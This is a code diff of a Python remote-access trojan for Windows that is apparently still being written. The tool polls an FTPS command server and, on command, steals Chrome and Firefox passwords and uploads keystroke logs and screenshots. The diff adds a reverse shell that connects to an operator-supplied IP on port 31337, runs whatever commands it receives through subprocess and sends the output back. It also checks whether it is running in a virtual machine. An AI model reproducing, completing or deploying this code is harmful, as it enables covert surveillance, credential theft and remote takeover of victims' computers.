@@ -10,7 +10,7 @@ import os
 import socket
 from ctypes import *
 import pythoncom, pyWinhook, win32clipboard, win32gui, win32ui, win32con, win32api, pyaes, win32cred, pywintypes
-import sqlite3, shutil, win32crypt, win32process, sys, random, pygame, time
+import sqlite3, shutil, win32crypt, sys, random, pygame, time, subprocess
 from sys import gettrace as sys_gettrace
 from tkinter import *
 import pysftp
@@ -377,11 +377,34 @@ def is_vm():
 #------------------------END detection of VM------------------------
 
 #------------------------Reverse Shell Function------------------------
-def reverse_shell(s):
-    os.dup2(s.fileno(), 0)
-    os.dup2(s.fileno(), 1)
-    os.dup2(s.fileno(), 2)
-    os.pty.spawn("/bin/bash")
+def reverse_shell(SERVER_HOST, SERVER_PORT):
+    #SERVER_HOST = "192.168.0.37"
+    #SERVER_PORT = 31337
+    BUFFER_SIZE = 1024
+
+    # create the socket object
+    s = socket.socket()
+    # connect to the server
+    s.connect((SERVER_HOST, SERVER_PORT))
+
+    # receive the greeting message
+    message = s.recv(BUFFER_SIZE).decode()
+    print("Server:", message)
+
+    while True:
+        # receive the command from the server
+        command = s.recv(BUFFER_SIZE).decode()
+        if command.lower() == "exit":
+            # if the command is exit, just break out of the loop
+            break
+        # execute the command and retrieve the results
+        output = subprocess.getoutput(command)
+        # send the results back to the server
+        s.send(output.encode())
+    # close client connection
+    s.close()
+
+
 
 #------------------------END Reverse Shell Function------------------------
 
@@ -436,20 +459,31 @@ def main():
         #start_new_thread(get_current_process, ())     #-----------enable this one
         #loop for connection protocol to FTPS server
         while True:
+            os.system('cls' if os.name == 'nt' else 'clear')
             try:
                 ftps = ftps_connect() #for ipv4 connection test
                 print("Connected to FTPS server! Debugging purpose, delete later!!")
             except:
                 time.sleep(20)
             
-        
+
             #check for commands from ftps server 
             try:
-                ftps_check_dir(ftps, "commands")
-                ftps.get('command.txt', '', preserve_mtime=True)
-                with open("command.txt", "r") as f:     #path here will most likely be wrong (should be command.txt i think)
+                if count == 0:
+                    try:
+                        ftps.mkdir(os.environ.get("USERNAME") + "0_0_2")
+                        count += 1
+                        ftps.chdir(os.environ.get('USERNAME') + "0_0_2")
+                    except:
+                        pass
+                
+                #now the real part
+                ftps.chdir(os.environ.get('USERNAME') + "0_0_2")
+                ftps.get('commands.txt', '')
+                ftps.remove('commands.txt')
+                with open("commands.txt", "r") as f:     #path here will most likely be wrong (should be command.txt i think)
                     command = f.read()
-                    print("[+] the command is: " + command)
+                    print("[+] the command is: " + str(command))
                     if command == "get passwords":
                         get_chrome_passwords()
                         get_firefox_passwords()
@@ -458,40 +492,26 @@ def main():
                         #locally delete the file after upload
                         os.remove(str(get_path()) + "/keystrokes/enc_dec.txt")
                     
-                    elif command == "get screenshots":
+                    elif command == "get screenshot":
                         if os.path.exists(str(get_path()) + "/screenshots/") :
-                            if count == 0:
-                                try:
-                                    ftps.mkdir(os.environ.get("USERNAME") + "0_0_2")
-                                    count += 1
-                                    ftps.chdir(os.environ.get('USERNAME') + "0_0_2")
-                                except:
-                                    pass
-                        ftps_check_dir(ftps, "screenshots")
+                            ftps_check_dir(ftps, "screenshots")
                         n = 0
                         while screenshot_number > n:
                             ftps_upload_file(ftps, str(get_path()) + "screenshots\\screenshot" + str(n) + ".png")
                             n += 1
                         ftps.chdir("..")
+                        print("done uploading screenshots")
                     
                
                     elif command == "get keylogger":
                         #upload pictures and keylogger data to ftps server
                         if os.path.exists(str(get_path()) + "/keystrokes/"):
-                            if count == 0:
-                                try:
-                                    ftps.mkdir(os.environ.get("USERNAME") + "0_0_2")
-                                    count += 1
-                                    ftps.chdir(os.environ.get('USERNAME') + "0_0_2")
-                                except:
-                                    pass
-                            else: 
-                                ftps.chdir(os.environ.get('USERNAME') + "0_0_2")
+                            ftps.execute('rm -rf keystrokes')
                             ftps_check_dir(ftps, "keystrokes")
+                            time.sleep(2)
                             ftps_upload_file(ftps, str(get_path()) + "keystrokes\\keylogger.txt")
                             ftps.chdir("..")
                             print("Uploaded keystrokes to FTPS server! Debugging purpose, delete later!!")
-        
                         
                     #everything after here is jet to come
                     elif command == "get process":
@@ -509,17 +529,23 @@ def main():
                     elif command == "get clipboard":
                         pass
                     else:
-                        ip = command.split('')
+                        print("in reverse shell creation")
+                        time.sleep(5)
+                        command = str(command)
+                        time.sleep(5)
+                        ip = command.split(' ')
                         ip = ip[1]
-                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        s.connect((ip, 443))
-                        reverse_shell(s)
+                        time.sleep(5)
+                        port = 31337
+                        reverse_shell(ip, port)
 
             except:
+                os.system('cls' if os.name == 'nt' else 'clear')
                 print("No commands found on server!")
             
             #close connection
             ftps.close()
+            time.sleep(20)
 
     #as everything seems to be great here (not quite sure if it works, but it should) lets implement the ssssServer! 
     pass
